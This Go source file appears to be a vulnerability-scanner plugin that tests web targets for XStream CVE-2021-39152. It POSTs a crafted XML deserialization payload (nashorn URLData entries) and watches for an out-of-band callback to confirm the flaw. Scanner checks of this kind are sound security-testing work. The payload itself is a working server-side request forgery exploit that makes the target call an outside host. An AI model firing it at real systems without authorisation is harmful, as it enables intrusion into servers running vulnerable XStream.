/**
2 * @Author: shaochuyu
3 * @Date: 3/23/24
4 */

package xstream

import (
	"bytes"
	"context"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/reverse"
	logger "wscan/core/utils/log"
)

type CVE_2021_39152 struct {
}

func (p *CVE_2021_39152) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Infof("开始检测xstream/CVE-2021-39152, %s", flow.Request.URL())
			payload := `<map>
          <entry>
            <jdk.nashorn.internal.runtime.Source_-URLData>
              <url>http://{{interactsh-url}}/internal/</url>
              <cs>GBK</cs>
              <hash>1111</hash>
              <array>b</array>
              <length>0</length>
              <lastModified>0</lastModified>
            </jdk.nashorn.internal.runtime.Source_-URLData>
            <jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/>
          </entry>
          <entry>
            <jdk.nashorn.internal.runtime.Source_-URLData>
              <url>{{reverse-url}}</url>
              <cs reference='../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs'/>
              <hash>1111</hash>
              <array>b</array>
              <length>0</length>
              <lastModified>0</lastModified>
            </jdk.nashorn.internal.runtime.Source_-URLData>
            <jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/>
          </entry>
        </map>`

			unit := ab.Reverse.Register(nil)
			payload = strings.Replace(payload, "{{reverse-url}}", unit.GetRmiURL(), -1)
			req, _ := http.NewRequest("POST",
				flow.Request.URL().JoinPath("/").String(),
				nil)
			req.WithXMLBody(bytes.NewReader([]byte(payload)))
			res, err := ab.HTTPClient.Respond(context.TODO(), req)
			if err != nil {
				return nil
			}
			unit.OnVisit(func(event *reverse.Event) error {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
				return nil
			})
			unit.Fetch(0)
			return nil
		},
		Channel: "web-generic",
		Binding: &model.VulnBinding{ID: "xstream/CVE-2021-39152",
			Plugin:   "xstream/CVE-2021-39152",
			Category: "xstream/CVE-2021-39152"},
		NeedReverse: true,
	}
}
